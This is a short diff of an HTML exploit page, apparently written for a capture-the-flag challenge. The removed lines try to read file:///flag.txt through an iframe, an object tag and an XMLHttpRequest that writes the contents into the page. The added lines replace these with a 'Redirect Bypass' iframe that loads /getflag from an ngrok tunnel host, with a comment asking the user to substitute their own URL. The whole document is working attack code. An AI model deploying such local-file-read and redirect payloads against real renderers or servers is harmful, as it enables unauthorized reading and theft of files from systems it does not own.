@@ -1,19 +1,8 @@
 <html>
 <body>
-    <h1>Attempting to read flag...</h1>
+    <h1>Exploit: Redirect Bypass</h1>
     <br>
-    <h2>Iframe Method:</h2>
-    <iframe src="file:///flag.txt" width="1000" height="500"></iframe>
-    <br>
-    <h2>Object Method:</h2>
-    <object data="file:///flag.txt" type="text/plain" width="1000" height="500"></object>
-    <br>
-    <h2>Javascript Method:</h2>
-    <script>
-        var x = new XMLHttpRequest();
-        x.open("GET", "file:///flag.txt", false);
-        x.send();
-        document.write("<pre>" + x.responseText + "</pre>");
-    </script>
+    <!-- Replace the URL below with your actual ngrok URL + /getflag -->
+    <iframe src="https://ab8039cf4ad6.ngrok-free.app/getflag" width="1000" height="800"></iframe>
 </body>
 </html>
